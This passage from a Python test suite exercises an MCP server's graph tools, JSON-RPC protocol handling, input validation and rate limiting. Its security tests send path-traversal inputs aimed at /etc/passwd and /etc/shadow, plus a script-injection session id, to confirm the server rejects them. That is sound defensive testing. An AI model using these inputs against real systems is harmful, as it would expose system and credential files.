            res, dur = self.run_mcp_request("tools/call", {"name": "graph_search", "arguments": args})
            total_duration += dur
            text = self._graph_content_text(res)
            got_invalid = "INVALID_ARGUMENT" in text
            results.append({"label": label, "got_invalid_argument": got_invalid})

        pass_count = sum(1 for r in results if r["got_invalid_argument"])
        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/graph_search/validation",
            passed=pass_count == len(cases),
            score=pass_count / len(cases),
            details={"cases": results},
            duration_ms=total_duration,
        )

    def test_graph_search_happy_path(self) -> TestResult:
        """graph_search returns symbols list or GRAPH_UNAVAILABLE."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "graph_search",
            "arguments": {"file_id": "src/ws_ctx_engine/graph/cozo_store.py"},
        })
        text = self._graph_content_text(result)
        payload = self._graph_payload(result)

        has_symbols = "symbols" in payload
        graph_unavailable = "GRAPH_UNAVAILABLE" in text
        graceful = has_symbols or graph_unavailable

        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/graph_search/happy_path",
            passed="result" in result and graceful,
            score=1.0 if ("result" in result and graceful) else 0.0,
            details={"has_symbols": has_symbols, "graph_unavailable": graph_unavailable},
            duration_ms=duration,
        )

    def test_graph_call_chain_validation(self) -> TestResult:
        """call_chain rejects missing from_fn or to_fn with INVALID_ARGUMENT."""
        cases = [
            ({}, "missing both"),
            ({"from_fn": "callers_of"}, "missing to_fn"),
            ({"to_fn": "_query"}, "missing from_fn"),
        ]
        results = []
        total_duration = 0.0
        for args, label in cases:
            res, dur = self.run_mcp_request("tools/call", {"name": "call_chain", "arguments": args})
            total_duration += dur
            text = self._graph_content_text(res)
            got_invalid = "INVALID_ARGUMENT" in text
            results.append({"label": label, "got_invalid_argument": got_invalid})

        pass_count = sum(1 for r in results if r["got_invalid_argument"])
        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/call_chain/validation",
            passed=pass_count == len(cases),
            score=pass_count / len(cases),
            details={"cases": results},
            duration_ms=total_duration,
        )

    def test_graph_call_chain_happy_path(self) -> TestResult:
        """call_chain returns non-empty path for known call chain — NOT NOT_IMPLEMENTED."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "call_chain",
            "arguments": {"from_fn": "callers_of", "to_fn": "_query", "max_depth": 5},
        })
        text = self._graph_content_text(result)
        payload = self._graph_payload(result)

        not_implemented = "NOT_IMPLEMENTED" in text
        graph_unavailable = "GRAPH_UNAVAILABLE" in text
        has_path_key = "path" in payload
        path = payload.get("path") or []
        # When graph is available: path must be non-empty for this known direct call
        data_correct = graph_unavailable or len(path) > 0

        # Pass: has path key with non-empty result OR graph unavailable — NOT NOT_IMPLEMENTED
        graceful = (has_path_key or graph_unavailable) and not not_implemented

        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/call_chain/happy_path",
            passed="result" in result and graceful and data_correct,
            score=1.0 if ("result" in result and graceful and data_correct) else 0.0,
            details={
                "has_path_key": has_path_key,
                "graph_unavailable": graph_unavailable,
                "not_implemented": not_implemented,
                "path": path,
                "path_length": len(path),
            },
            duration_ms=duration,
            error_message="call_chain still returns NOT_IMPLEMENTED" if not_implemented else "",
        )

    def test_graph_tools_graceful_degradation(self) -> TestResult:
        """All graph tools respond gracefully — never crash, always return result."""
        tools = [
            ("find_callers", {"fn_name": "nonexistent_xyz_987"}),
            ("impact_analysis", {"file_path": "nonexistent_xyz_987.py"}),
            ("graph_search", {"file_id": "nonexistent_xyz_987.py"}),
            ("call_chain", {"from_fn": "nonexistent_a", "to_fn": "nonexistent_b"}),
            ("get_status", {}),
        ]
        results = []
        total_duration = 0.0
        for tool_name, args in tools:
            res, dur = self.run_mcp_request("tools/call", {"name": tool_name, "arguments": args})
            total_duration += dur
            responded = "result" in res  # Must not be a raw crash
            results.append({"tool": tool_name, "responded": responded})

        pass_count = sum(1 for r in results if r["responded"])
        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/graceful_degradation",
            passed=pass_count == len(tools),
            score=pass_count / len(tools),
            details={"results": results},
            duration_ms=total_duration,
        )

    def test_graph_tools_performance(self) -> TestResult:
        """Graph tools complete within acceptable latency on warm path."""
        warm_latencies: List[float] = []
        error_message = ""

        try:
            with PersistentMCPSession(self.WORKSPACE, self.WSCTX_CMD) as session:
                # Warm-up
                session.call("get_status", {}, timeout=PersistentMCPSession.COLD_START_TIMEOUT)

                calls = [
                    ("get_status", {}),
                    ("find_callers", {"fn_name": "_query"}),
                    ("impact_analysis", {"file_path": "src/ws_ctx_engine/models/models.py"}),
                    ("graph_search", {"file_id": "src/ws_ctx_engine/graph/cozo_store.py"}),
                    ("call_chain", {"from_fn": "callers_of", "to_fn": "_query"}),
                ]
                for tool, args in calls:
                    res, ms = session.call(tool, args, timeout=15)
                    if "result" in res:
                        warm_latencies.append(ms)
        except Exception as exc:
            error_message = str(exc)

        avg_ms = statistics.mean(warm_latencies) if warm_latencies else 0.0
        # Graph queries hit CozoDB — target <500ms per call warm
        score = 1.0 if avg_ms < 500 else 0.8 if avg_ms < 2000 else 0.5 if avg_ms < 5000 else 0.0

        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/performance",
            passed=bool(warm_latencies) and avg_ms < 5000,
            score=score,
            details={
                "avg_warm_ms": round(avg_ms, 1),
                "samples": len(warm_latencies),
                "error": error_message,
            },
            duration_ms=avg_ms,
            error_message=error_message,
        )

    # =========================================================================
    # CATEGORY 11: Graph Tool Semantic Correctness
    # (checks real data values, not just structural key presence)
    # =========================================================================

    def test_graph_find_callers_multi_file(self) -> TestResult:
        """bulk_upsert is called from indexer, tests, benchmark — expect ≥2 caller files."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "find_callers",
            "arguments": {"fn_name": "bulk_upsert"},
        })
        payload = self._graph_payload(result)
        graph_unavailable = "GRAPH_UNAVAILABLE" in self._graph_content_text(result)
        callers = payload.get("callers", [])
        caller_files = [c.get("caller_file", "") for c in callers]
        multi_caller = graph_unavailable or len(callers) >= 2

        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/find_callers/multi_file_callers",
            passed="result" in result and multi_caller,
            score=1.0 if ("result" in result and multi_caller) else 0.0,
            details={
                "callers_count": len(callers),
                "caller_files": caller_files[:5],
                "graph_unavailable": graph_unavailable,
            },
            duration_ms=duration,
        )

    def test_graph_impact_analysis_core_module(self) -> TestResult:
        """models/models.py is imported widely — must return ≥1 importer when graph available."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "impact_analysis",
            "arguments": {"file_path": "src/ws_ctx_engine/models/models.py"},
        })
        payload = self._graph_payload(result)
        text = self._graph_content_text(result)
        graph_unavailable = "GRAPH_UNAVAILABLE" in text
        importers = payload.get("importers", [])
        has_data = graph_unavailable or len(importers) >= 1

        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/impact_analysis/core_module_has_importers",
            passed="result" in result and has_data,
            score=1.0 if ("result" in result and has_data) else 0.0,
            details={
                "importers_count": len(importers),
                "sample": importers[:3],
                "graph_unavailable": graph_unavailable,
            },
            duration_ms=duration,
        )

    def test_graph_search_known_symbols(self) -> TestResult:
        """cozo_store.py must expose GraphStore, _query, callers_of in its symbol list."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "graph_search",
            "arguments": {"file_id": "src/ws_ctx_engine/graph/cozo_store.py"},
        })
        payload = self._graph_payload(result)
        text = self._graph_content_text(result)
        graph_unavailable = "GRAPH_UNAVAILABLE" in text
        symbols = payload.get("symbols", [])
        sym_names = {s.get("sym", "").split("#")[-1] for s in symbols}
        expected = {"GraphStore", "_query", "callers_of"}
        found = expected & sym_names
        has_expected = graph_unavailable or len(found) == len(expected)

        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/graph_search/known_symbols_present",
            passed="result" in result and has_expected,
            score=1.0 if ("result" in result and has_expected) else len(found) / len(expected),
            details={
                "expected": list(expected),
                "found": list(found),
                "missing": list(expected - sym_names),
                "total_symbols": len(symbols),
                "graph_unavailable": graph_unavailable,
            },
            duration_ms=duration,
        )

    def test_graph_call_chain_depth_cap(self) -> TestResult:
        """max_depth=20 must be silently capped to 10 — response must not error."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "call_chain",
            "arguments": {"from_fn": "callers_of", "to_fn": "_query", "max_depth": 20},
        })
        text = self._graph_content_text(result)
        payload = self._graph_payload(result)
        graph_unavailable = "GRAPH_UNAVAILABLE" in text
        not_invalid_arg = "INVALID_ARGUMENT" not in text
        has_path = "path" in payload
        # Pass: no INVALID_ARGUMENT error (depth accepted gracefully), OR graph unavailable
        acceptable = graph_unavailable or (not_invalid_arg and has_path)

        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/call_chain/max_depth_capped",
            passed="result" in result and acceptable,
            score=1.0 if ("result" in result and acceptable) else 0.0,
            details={
                "accepted_depth_20": not_invalid_arg,
                "has_path": has_path,
                "graph_unavailable": graph_unavailable,
                "path": payload.get("path"),
            },
            duration_ms=duration,
        )

    def test_graph_call_chain_same_function(self) -> TestResult:
        """call_chain(fn, fn) — from_fn == to_fn must return single-element path [fn]."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "call_chain",
            "arguments": {"from_fn": "_query", "to_fn": "_query"},
        })
        payload = self._graph_payload(result)
        text = self._graph_content_text(result)
        graph_unavailable = "GRAPH_UNAVAILABLE" in text
        path = payload.get("path", [])
        self_path = graph_unavailable or (len(path) == 1 and path[0] == "_query")

        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/call_chain/self_path_single_element",
            passed="result" in result and self_path,
            score=1.0 if ("result" in result and self_path) else 0.0,
            details={
                "path": path,
                "expected": ["_query"],
                "graph_unavailable": graph_unavailable,
            },
            duration_ms=duration,
        )

    def test_graph_call_chain_no_path(self) -> TestResult:
        """Functions with no shared call chain must return path=[] not an error."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "call_chain",
            "arguments": {"from_fn": "nonexistent_fn_xyz_999", "to_fn": "another_xyz_999"},
        })
        text = self._graph_content_text(result)
        payload = self._graph_payload(result)
        graph_unavailable = "GRAPH_UNAVAILABLE" in text
        path = payload.get("path", None)
        is_empty_list = path == []
        # Pass: path=[] when graph is available, OR graph gracefully unavailable
        acceptable = graph_unavailable or is_empty_list

        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/call_chain/no_path_returns_empty_list",
            passed="result" in result and acceptable,
            score=1.0 if ("result" in result and acceptable) else 0.0,
            details={
                "path": path,
                "expected": [],
                "graph_unavailable": graph_unavailable,
            },
            duration_ms=duration,
        )

    # =========================================================================
    # CATEGORY 12: Protocol Depth
    # =========================================================================

    def test_jsonrpc_id_integer(self) -> TestResult:
        """JSON-RPC response id must echo back integer request id."""
        result, duration = self.run_mcp_request(
            "tools/call",
            {"name": "get_index_status", "arguments": {}},
            request_id=42,
        )
        echo_id = result.get("id")
        correct = echo_id == 42

        return TestResult(
            category=TestCategory.PROTOCOL.value,
            test_name="protocol/jsonrpc_id_echo_integer",
            passed=correct,
            score=1.0 if correct else 0.0,
            details={"sent_id": 42, "received_id": echo_id},
            duration_ms=duration,
        )

    def test_jsonrpc_id_string(self) -> TestResult:
        """JSON-RPC response id must echo back string request id."""
        req = json.dumps({
            "jsonrpc": "2.0",
            "id": "req-abc-123",
            "method": "tools/call",
            "params": {"name": "get_index_status", "arguments": {}},
        })
        cmd = f"echo '{req}' | {self.WSCTX_CMD} mcp --workspace {self.WORKSPACE}"
        t0 = time.time()
        try:
            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            duration = (time.time() - t0) * 1000
            result = json.loads(proc.stdout) if proc.stdout.strip() else {}
        except Exception as exc:
            return TestResult(
                category=TestCategory.PROTOCOL.value,
                test_name="protocol/jsonrpc_id_echo_string",
                passed=False, score=0.0,
                details={"error": str(exc)}, duration_ms=0,
            )
        echo_id = result.get("id")
        correct = echo_id == "req-abc-123"

        return TestResult(
            category=TestCategory.PROTOCOL.value,
            test_name="protocol/jsonrpc_id_echo_string",
            passed=correct,
            score=1.0 if correct else 0.0,
            details={"sent_id": "req-abc-123", "received_id": echo_id},
            duration_ms=duration,
        )

    def test_tools_list_all_twelve(self) -> TestResult:
        """tools/list must return all 12 expected tool names."""
        result, duration = self.run_mcp_request("tools/list")
        tools = result.get("result", {}).get("tools", [])
        names = {t["name"] for t in tools if isinstance(t, dict)}
        expected = {
            "search_codebase", "get_file_context", "get_domain_map",
            "get_index_status", "index_status", "pack_context",
            "session_clear", "find_callers", "impact_analysis",
            "graph_search", "call_chain", "get_status",
        }
        missing = expected - names
        extra = names - expected

        return TestResult(
            category=TestCategory.TOOLS.value,
            test_name="tools/list_all_12_present",
            passed=len(missing) == 0,
            score=(len(expected) - len(missing)) / len(expected),
            details={
                "expected_count": len(expected),
                "found_count": len(names),
                "missing": sorted(missing),
                "extra": sorted(extra),
            },
            duration_ms=duration,
        )

    def test_tools_schema_required_fields(self) -> TestResult:
        """Every tool with required args must declare them in inputSchema.required."""
        result, duration = self.run_mcp_request("tools/list")
        tools = result.get("result", {}).get("tools", [])
        # Known required-arg tools and their required field names
        must_have_required = {
            "search_codebase": ["query"],
            "get_file_context": ["path"],
            "pack_context": ["query"],
            "find_callers": ["fn_name"],
            "impact_analysis": ["file_path"],
            "graph_search": ["file_id"],
            "call_chain": ["from_fn", "to_fn"],
        }
        issues = []
        for t in tools:
            name = t.get("name", "")
            if name not in must_have_required:
                continue
            schema = t.get("inputSchema", {})
            required = schema.get("required", [])
            for field in must_have_required[name]:
                if field not in required:
                    issues.append(f"{name} missing required field '{field}'")

        return TestResult(
            category=TestCategory.TOOLS.value,
            test_name="tools/schema_required_fields_declared",
            passed=len(issues) == 0,
            score=1.0 if not issues else 0.0,
            details={"issues": issues, "checked_tools": len(must_have_required)},
            duration_ms=duration,
        )

    # =========================================================================
    # CATEGORY 13: Security — Path Guard
    # =========================================================================

    def test_path_traversal_get_file_context(self) -> TestResult:
        """get_file_context must reject paths that escape the workspace root."""
        traversal_paths = [
            "../../etc/passwd",
            "../../../etc/shadow",
            "src/../../etc/hosts",
            "/etc/passwd",
        ]
        results = []
        total_duration = 0.0
        for path in traversal_paths:
            res, dur = self.run_mcp_request("tools/call", {
                "name": "get_file_context",
                "arguments": {"path": path},
            })
            total_duration += dur
            text = ""
            try:
                text = res.get("result", {}).get("content", [{}])[0].get("text", "")
            except (IndexError, AttributeError):
                pass
            # Must NOT return actual file content — should be error or empty
            blocked = (
                "error" in text.lower()
                or "not found" in text.lower()
                or "outside" in text.lower()
                or "invalid" in text.lower()
                or "permission" in text.lower()
                or text.strip() == ""
                or "error" in res
            )
            # The file content of /etc/passwd would contain "root:" — definitive leak indicator
            leaked = "root:" in text or "daemon:" in text
            results.append({
                "path": path,
                "blocked": blocked and not leaked,
                "leaked": leaked,
            })

        all_blocked = all(r["blocked"] for r in results)
        no_leak = not any(r["leaked"] for r in results)

        return TestResult(
            category=TestCategory.SECURITY.value,
            test_name="security/path_traversal_blocked",
            passed=all_blocked and no_leak,
            score=1.0 if (all_blocked and no_leak) else (0.5 if no_leak else 0.0),
            details={"results": results, "all_blocked": all_blocked, "no_leak": no_leak},
            duration_ms=total_duration,
        )

    def test_workspace_absolute_path_outside(self) -> TestResult:
        """Absolute paths outside the workspace must not serve content."""
        res, duration = self.run_mcp_request("tools/call", {
            "name": "get_file_context",
            "arguments": {"path": "/tmp/test_outside_workspace.txt"},
        })
        text = ""
        try:
            text = res.get("result", {}).get("content", [{}])[0].get("text", "")
        except (IndexError, AttributeError):
            pass
        # Should not crash; must return an error or not-found response
        safe = "result" in res and "root:" not in text

        return TestResult(
            category=TestCategory.SECURITY.value,
            test_name="security/absolute_path_outside_workspace",
            passed=safe,
            score=1.0 if safe else 0.0,
            details={"responded": "result" in res, "leaked_sensitive": "root:" in text},
            duration_ms=duration,
        )

    # =========================================================================
    # CATEGORY 14: Input Validation Deep
    # =========================================================================

    def test_agent_phase_invalid_value(self) -> TestResult:
        """pack_context with invalid agent_phase must not crash — handle gracefully."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "pack_context",
            "arguments": {"query": "test", "agent_phase": "invalid_phase_xyz"},
        })
        # Must respond (not crash) — either error or treat as unknown/default
        responded = "result" in result or "error" in result

        return TestResult(
            category=TestCategory.VALIDATION.value,
            test_name="input_validation/agent_phase_invalid_handled",
            passed=responded,
            score=1.0 if responded else 0.0,
            details={"responded": responded},
            duration_ms=duration,
        )

    def test_token_budget_below_minimum(self) -> TestResult:
        """pack_context with token_budget=999 (below minimum 1000) must be handled gracefully."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "pack_context",
            "arguments": {"query": "test", "token_budget": 999},
        })
        responded = "result" in result or "error" in result

        return TestResult(
            category=TestCategory.VALIDATION.value,
            test_name="input_validation/token_budget_below_minimum",
            passed=responded,
            score=1.0 if responded else 0.0,
            details={"responded": responded},
            duration_ms=duration,
        )

    def test_session_id_invalid_chars(self) -> TestResult:
        """session_clear with session_id containing invalid chars must return INVALID_ARGUMENT."""
        cases = [
            ("session id with spaces", "spaces"),
            ("session/with/slashes", "slashes"),
            ("session<script>xss</script>", "xss_attempt"),
            ("a" * 129, "too_long_129_chars"),
        ]
        results = []
        total_duration = 0.0
        for sid, label in cases:
            res, dur = self.run_mcp_request("tools/call", {
                "name": "session_clear",
                "arguments": {"session_id": sid},
            })
            total_duration += dur
            text = ""
            try:
                text = res.get("result", {}).get("content", [{}])[0].get("text", "")
            except (IndexError, AttributeError):
                pass
            got_invalid = "INVALID_ARGUMENT" in text or "error" in text.lower() or "error" in res
            results.append({"label": label, "got_error": got_invalid})

        caught = sum(1 for r in results if r["got_error"])
        return TestResult(
            category=TestCategory.VALIDATION.value,
            test_name="input_validation/session_id_invalid_chars_rejected",
            passed=caught == len(cases),
            score=caught / len(cases),
            details={"cases": results, "caught": caught, "total": len(cases)},
            duration_ms=total_duration,
        )

    def test_search_no_results_is_list(self) -> TestResult:
        """search_codebase for a nonexistent query returns results:[] not an error."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "search_codebase",
            "arguments": {"query": "nonexistent_xyz_zzz_999_abc", "limit": 5},
        })
        text = ""
        try:
            text = result.get("result", {}).get("content", [{}])[0].get("text", "")
            payload = json.loads(text)
        except (IndexError, AttributeError, json.JSONDecodeError):
            payload = {}

        has_results_key = "results" in payload
        is_list = isinstance(payload.get("results"), list)
        not_error = "error" not in payload

        return TestResult(
            category=TestCategory.VALIDATION.value,
            test_name="input_validation/search_no_results_returns_empty_list",
            passed="result" in result and has_results_key and is_list,
            score=1.0 if ("result" in result and has_results_key and is_list) else 0.0,
            details={
                "has_results_key": has_results_key,
                "is_list": is_list,
                "not_error": not_error,
            },
            duration_ms=duration,
        )

    # =========================================================================
    # CATEGORY 15: Data Integrity (semantic content checks)
    # =========================================================================

    def test_status_graph_counts_nonzero(self) -> TestResult:
        """get_status must report node_count > 0 and edge_count > 0 when index exists."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "get_status",
            "arguments": {},
        })
        payload = self._graph_payload(result)
        graph = payload.get("graph_store", {})
        available = graph.get("available", False)
        node_count = graph.get("node_count", 0)
        edge_count = graph.get("edge_count", 0)
        # Only assert counts if graph is available
        counts_ok = not available or (node_count > 0 and edge_count > 0)

        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="data_integrity/status_graph_counts_nonzero",
            passed="result" in result and counts_ok,
            score=1.0 if ("result" in result and counts_ok) else 0.0,
            details={
                "graph_available": available,
                "node_count": node_count,
                "edge_count": edge_count,
            },
            duration_ms=duration,
        )

    def test_search_result_field_schema(self) -> TestResult:
        """Each search result must contain 'path' and 'score' fields."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "search_codebase",
            "arguments": {"query": "config", "limit": 5},
        })
        text = ""
        try:
            text = result.get("result", {}).get("content", [{}])[0].get("text", "")
            payload = json.loads(text)
        except (IndexError, AttributeError, json.JSONDecodeError):
            payload = {}

        results_list = payload.get("results", [])
        issues = []
        for i, r in enumerate(results_list):
            if "path" not in r:
                issues.append(f"result[{i}] missing 'path'")
            if "score" not in r:
                issues.append(f"result[{i}] missing 'score'")

        return TestResult(
            category=TestCategory.CONTENT.value,
            test_name="data_integrity/search_results_have_path_and_score",
            passed=len(results_list) > 0 and len(issues) == 0,
            score=1.0 if (len(results_list) > 0 and not issues) else 0.0,
            details={
                "results_count": len(results_list),
                "schema_issues": issues,
            },
            duration_ms=duration,
        )

    def test_file_context_required_fields(self) -> TestResult:
        """get_file_context must return content, language, and line_count fields."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "get_file_context",
            "arguments": {"path": "src/ws_ctx_engine/mcp/tools.py"},
        })
        text = ""
        try:
            text = result.get("result", {}).get("content", [{}])[0].get("text", "")
            payload = json.loads(text)
        except (IndexError, AttributeError, json.JSONDecodeError):
            payload = {}

        has_content = bool(payload.get("content"))
        has_language = "language" in payload
        has_line_count = "line_count" in payload

        return TestResult(
            category=TestCategory.CONTENT.value,
            test_name="data_integrity/file_context_required_fields",
            passed="result" in result and has_content and has_language and has_line_count,
            score=sum([has_content, has_language, has_line_count]) / 3,
            details={
                "has_content": has_content,
                "has_language": has_language,
                "language": payload.get("language"),
                "has_line_count": has_line_count,
                "line_count": payload.get("line_count"),
            },
            duration_ms=duration,
        )

    def test_domain_map_structure(self) -> TestResult:
        """get_domain_map must return a non-empty domains list."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "get_domain_map",
            "arguments": {},
        })
        text = ""
        try:
            text = result.get("result", {}).get("content", [{}])[0].get("text", "")
            payload = json.loads(text)
        except (IndexError, AttributeError, json.JSONDecodeError):
            payload = {}

        domains = payload.get("domains", None)
        is_list = isinstance(domains, list)
        non_empty = is_list and len(domains) > 0

        return TestResult(
            category=TestCategory.CONTENT.value,
            test_name="data_integrity/domain_map_non_empty",
            passed="result" in result and non_empty,
            score=1.0 if ("result" in result and non_empty) else 0.0,
            details={
                "domains_is_list": is_list,
                "domains_count": len(domains) if is_list else 0,
                "sample": (domains or [])[:3],
            },
            duration_ms=duration,
        )

    # =========================================================================
    # CATEGORY 16: Error Response Consistency
    # =========================================================================

    def test_error_structure_consistency(self) -> TestResult:
        """All graph tools must return {error, message} on invalid input — not raw crashes."""
        invalid_calls = [
            ("find_callers", {}),
            ("find_callers", {"fn_name": ""}),
            ("impact_analysis", {}),
            ("impact_analysis", {"file_path": ""}),
            ("graph_search", {}),
            ("graph_search", {"file_id": ""}),
            ("call_chain", {}),
            ("call_chain", {"from_fn": "a"}),
        ]
        results = []
        total_duration = 0.0
        for tool_name, args in invalid_calls:
            res, dur = self.run_mcp_request("tools/call", {"name": tool_name, "arguments": args})
            total_duration += dur
            text = ""
            try:
                text = res.get("result", {}).get("content", [{}])[0].get("text", "")
                error_payload = json.loads(text)
            except (IndexError, AttributeError, json.JSONDecodeError):
                error_payload = {}
            has_error_key = "error" in error_payload
            has_message_key = "message" in error_payload
            consistent = has_error_key and has_message_key
            results.append({
                "tool": tool_name,
                "args": str(args),
                "has_error": has_error_key,
                "has_message": has_message_key,
                "consistent": consistent,
            })

        consistent_count = sum(1 for r in results if r["consistent"])
        return TestResult(
            category=TestCategory.ERROR_HANDLING.value,
            test_name="error_handling/error_structure_has_error_and_message",
            passed=consistent_count == len(invalid_calls),
            score=consistent_count / len(invalid_calls),
            details={
                "consistent": consistent_count,
                "total": len(invalid_calls),
                "failures": [r for r in results if not r["consistent"]],
            },
            duration_ms=total_duration,
        )

    def test_graph_unavailable_error_structure(self) -> TestResult:
        """GRAPH_UNAVAILABLE response must include error and message fields."""
        # Call with a mocked unhealthy store scenario isn't possible via MCP,
        # but we can verify the live store returns proper {error, message} for bad args.
        result, duration = self.run_mcp_request("tools/call", {
            "name": "find_callers",
            "arguments": {"fn_name": ""},  # triggers INVALID_ARGUMENT
        })
        try:
            text = result.get("result", {}).get("content", [{}])[0].get("text", "")
            payload = json.loads(text)
        except (IndexError, AttributeError, json.JSONDecodeError):
            payload = {}

        has_error = "error" in payload
        has_message = "message" in payload

        return TestResult(
            category=TestCategory.ERROR_HANDLING.value,
            test_name="error_handling/graph_error_response_fields",
            passed="result" in result and has_error and has_message,
            score=1.0 if ("result" in result and has_error and has_message) else 0.0,
            details={
                "has_error_field": has_error,
                "has_message_field": has_message,
                "error_value": payload.get("error"),
                "message_value": payload.get("message"),
            },
            duration_ms=duration,
        )

    # =========================================================================
    # CATEGORY 17: Rate Limiting
    # =========================================================================

    def test_rate_limit_triggers(self) -> TestResult:
        """Calling pack_context (limit=5/min) 7 times rapidly should trigger RATE_LIMIT_EXCEEDED."""
        rate_limited = False
        responded_count = 0
        total_duration = 0.0
        for _ in range(7):
            res, dur = self.run_mcp_request("tools/call", {
                "name": "pack_context",
                "arguments": {"query": "test", "format": "json"},
            }, timeout=60)
            total_duration += dur
            if "result" in res:
                responded_count += 1
                try:
                    text = res.get("result", {}).get("content", [{}])[0].get("text", "")
                    if "RATE_LIMIT" in text:
                        rate_limited = True
                        break
                except (IndexError, AttributeError):
                    pass

        # Pass if rate limit triggered OR all responded without crash (graceful either way)
        graceful = rate_limited or responded_count > 0

        return TestResult(
            category=TestCategory.RATE_LIMIT.value,
            test_name="rate_limit/pack_context_triggers_on_burst",
            passed=graceful,
            score=1.0 if rate_limited else (0.8 if graceful else 0.0),
            details={
                "rate_limited_triggered": rate_limited,
                "responded_count": responded_count,
                "calls_made": 7,
            },
            duration_ms=total_duration,
        )

    def test_rate_limit_get_status_recovery(self) -> TestResult:
        """After rapid calls, tool must recover and respond correctly."""
        # Exhaust limit
        for _ in range(12):
            self.run_mcp_request("tools/call", {"name": "get_status", "arguments": {}}, timeout=15)

        # After exhaustion, a fresh request should still respond (even if rate limited)
        result, duration = self.run_mcp_request("tools/call", {"name": "get_status", "arguments": {}}, timeout=15)
        responded = "result" in result or "error" in result

        return TestResult(
            category=TestCategory.RATE_LIMIT.value,
            test_name="rate_limit/server_responds_after_burst",
            passed=responded,
            score=1.0 if responded else 0.0,
            details={"responded": responded},
            duration_ms=duration,
        )

    # =========================================================================
    # Run All Tests
    # =========================================================================

    def run_all_tests(self):
        """Execute all tests and generate report."""
        print("=" * 70)
        print("MCP COMPREHENSIVE COMPLIANCE & STRESS TEST SUITE")
        print("=" * 70)
        print(f"Target Workspace: {self.WORKSPACE}")
        print(f"Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("-" * 70)
        
        tests = [
            # Protocol Compliance
            self.test_protocol_initialize,
            self.test_protocol_tools_list,
            self.test_protocol_notifications,

            # Tool Discovery
            self.test_tool_discovery_comprehensive,

            # Input Validation
            self.test_input_validation_missing_required,
            self.test_input_validation_invalid_types,
            self.test_input_validation_boundary_values,
            self.test_input_validation_sql_injection,

            # Error Handling
            self.test_error_handling_unknown_method,
            self.test_error_handling_unknown_tool,

            # Performance
            self.test_performance_single_request_latency,
            self.test_performance_search_latency,
            self.test_performance_pack_context,

            # Concurrency
            self.test_concurrency_multiple_parallel,
            self.test_concurrency_mixed_tools,

            # Timeout
            self.test_timeout_handling,

            # Structured Content
            self.test_structured_content_format,

            # Graph Tools (Phase 4)
            self.test_graph_tools_registered,
            self.test_graph_get_status,
            self.test_graph_find_callers_validation,
            self.test_graph_find_callers_happy_path,
            self.test_graph_impact_analysis_validation,
            self.test_graph_impact_analysis_happy_path,
            self.test_graph_search_validation,
            self.test_graph_search_happy_path,
            self.test_graph_call_chain_validation,
            self.test_graph_call_chain_happy_path,
            self.test_graph_tools_graceful_degradation,
            self.test_graph_tools_performance,

            # Graph Semantic Correctness (Phase 5 — real data assertions)
            self.test_graph_find_callers_multi_file,
            self.test_graph_impact_analysis_core_module,
            self.test_graph_search_known_symbols,
            self.test_graph_call_chain_depth_cap,
            self.test_graph_call_chain_same_function,
            self.test_graph_call_chain_no_path,

            # Protocol Depth
            self.test_jsonrpc_id_integer,
            self.test_jsonrpc_id_string,
            self.test_tools_list_all_twelve,
            self.test_tools_schema_required_fields,

            # Security — Path Guard
            self.test_path_traversal_get_file_context,
            self.test_workspace_absolute_path_outside,

            # Input Validation Deep
            self.test_agent_phase_invalid_value,
            self.test_token_budget_below_minimum,
            self.test_session_id_invalid_chars,
            self.test_search_no_results_is_list,

            # Data Integrity
            self.test_status_graph_counts_nonzero,
            self.test_search_result_field_schema,
            self.test_file_context_required_fields,
            self.test_domain_map_structure,

            # Error Consistency
            self.test_error_structure_consistency,
            self.test_graph_unavailable_error_structure,

            # Rate Limiting
            self.test_rate_limit_triggers,
            self.test_rate_limit_get_status_recovery,
        ]
        
        for test_func in tests:
            print(f"Running: {test_func.__name__}...", end=" ", flush=True)
            try:
                result = test_func()
                self.results.append(result)
                status = "✓" if result.passed else "✗"
                print(f"{status} ({result.score*100:.0f}%)")
            except Exception as e:
                print(f"✗ Error: {e}")
                self.results.append(TestResult(
                    category="ERROR",
                    test_name=test_func.__name__,
                    passed=False,
                    score=0.0,
                    details={"error": str(e)},
                    duration_ms=0,
                    error_message=str(e)
                ))
        
        self.generate_report()
    
    def generate_report(self):
        """Generate comprehensive test report."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Calculate scores by category
        category_scores = {}
        for cat in TestCategory:
            cat_results = [r for r in self.results if r.category == cat.value]
            if cat_results:
                avg_score = statistics.mean([r.score for r in cat_results])
                passed_count = sum(1 for r in cat_results if r.passed)
                category_scores[cat.value] = {
                    "average_score": avg_score,
                    "total_tests": len(cat_results),
                    "passed": passed_count,
